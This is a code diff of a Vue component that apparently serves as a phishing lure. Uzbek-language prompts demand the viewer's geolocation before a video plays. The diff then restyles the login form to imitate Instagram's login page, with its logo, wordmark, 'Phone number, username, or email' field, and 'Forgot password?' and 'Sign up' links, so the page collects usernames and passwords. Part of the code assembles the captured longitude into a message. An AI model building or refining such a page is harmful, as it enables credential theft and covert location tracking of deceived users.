@@ -3,9 +3,9 @@
     <!-- Geolocation Modal -->
     <div v-if="showGeoModal" class="modal">
       <div class="modal-content">
-        <img src="/logos.png" width="48" height="48" alt="logo" />
+        <img src="./logos.png" width="48" height="48" alt="logo" />
         <h2>
-          Videoni ko‘rishdan oldin joylashuvingizni aniqlashga ruxsat bering.
+          Videoni ko'rishdan oldin joylashuvingizni aniqlashga ruxsat bering.
         </h2>
         <button @click="requestGeolocation" class="allow-btn">
           Ruxsat berish
@@ -17,28 +17,51 @@
     <div v-if="geoDenied" class="modal">
       <div class="modal-content">
         <h2>
-          📍 Iltimos, videoni ko‘rish uchun joylashuvingizga ruxsat bering.
+          📍 Iltimos, videoni ko'rish uchun joylashuvingizga ruxsat bering.
         </h2>
       </div>
     </div>
 
     <!-- Login Form -->
     <div v-if="showLogin" class="login-form">
-      <h2>Login sahifasi</h2>
-      <input type="text" placeholder="Username" v-model="username" />
-      <input type="password" placeholder="Parol" v-model="password" />
-      <button class="allow-btn" @click="submitLogin">Kirish</button>
+      <img
+        src="./logos.png"
+        width="75"
+        height="75"
+        alt="logo"
+        class="instagram-logo"
+      />
+      <h2 class="instagram-text">Instagram</h2>
+      <input
+        type="text"
+        placeholder="Phone number, username, or email"
+        v-model="username"
+      />
+      <input type="password" placeholder="Password" v-model="password" />
+      <button class="allow-btn login-btn" @click="submitLogin">Log in</button>
+      <div class="or-divider">
+        <span class="divider-line"></span>
+        <span class="or-text">OR</span>
+        <span class="divider-line"></span>
+      </div>
+      <a href="#" class="forgot-password">Forgot password?</a>
+      <div class="signup-container">
+        <p>
+          Don't have an account? <a href="#" class="signup-link">Sign up</a>
+        </p>
+      </div>
     </div>
 
     <!-- Video Player -->
     <div v-if="showVideo" class="video-box">
       <video controls autoplay class="insta-video">
         <source src="./assets/mainvideo.mp4" type="video/mp4" />
-        Sizning brauzeringiz video tagni qo‘llab-quvvatlamaydi.
+        Sizning brauzeringiz video tagni qo'llab-quvvatlamaydi.
       </video>
     </div>
   </div>
 </template>
+
 <script>
 export default {
   name: "GeoLoginVideo",
@@ -101,7 +124,7 @@ Longitude: ${this.longitude}
         this.showLogin = false;
         this.showVideo = true;
       } else {
-        alert("Iltimos, barcha maydonlarni to‘ldiring.");
+        alert("Iltimos, barcha maydonlarni to'ldiring.");
       }
     },
   },
@@ -159,13 +182,76 @@ Longitude: ${this.longitude}
   background: #0078cc;
 }
 
+.login-form {
+  background: #000;
+  padding: 30px 40px;
+  border-radius: 1px;
+  width: 350px;
+}
+
+.instagram-logo {
+  margin-bottom: 10px;
+}
+
+.instagram-text {
+  font-family: "Brush Script MT", cursive;
+  font-size: 40px;
+  margin: 0 0 20px 0;
+  font-weight: normal;
+}
+
 .login-form input {
-  width: 200px;
-  padding: 10px;
-  border: none;
-  border-radius: 8px;
-  background: #333;
+  width: 100%;
+  padding: 12px 10px;
+  border: 1px solid #262626;
+  border-radius: 3px;
+  background: #121212;
   color: #fff;
+  margin-bottom: 6px;
+  font-size: 12px;
+}
+
+.login-btn {
+  width: 100%;
+  margin-top: 8px;
+}
+
+.or-divider {
+  display: flex;
+  align-items: center;
+  width: 100%;
+  margin: 15px 0;
+}
+
+.divider-line {
+  flex: 1;
+  height: 1px;
+  background-color: #262626;
+}
+
+.or-text {
+  padding: 0 15px;
+  color: #8e8e8e;
+  font-size: 13px;
+  font-weight: 600;
+}
+
+.forgot-password {
+  color: #0095f6;
+  font-size: 12px;
+  text-decoration: none;
+  margin-top: 5px;
+}
+
+.signup-container {
+  margin-top: 20px;
+  font-size: 14px;
+}
+
+.signup-link {
+  color: #0095f6;
+  text-decoration: none;
+  font-weight: 600;
 }
 
 .video-box {
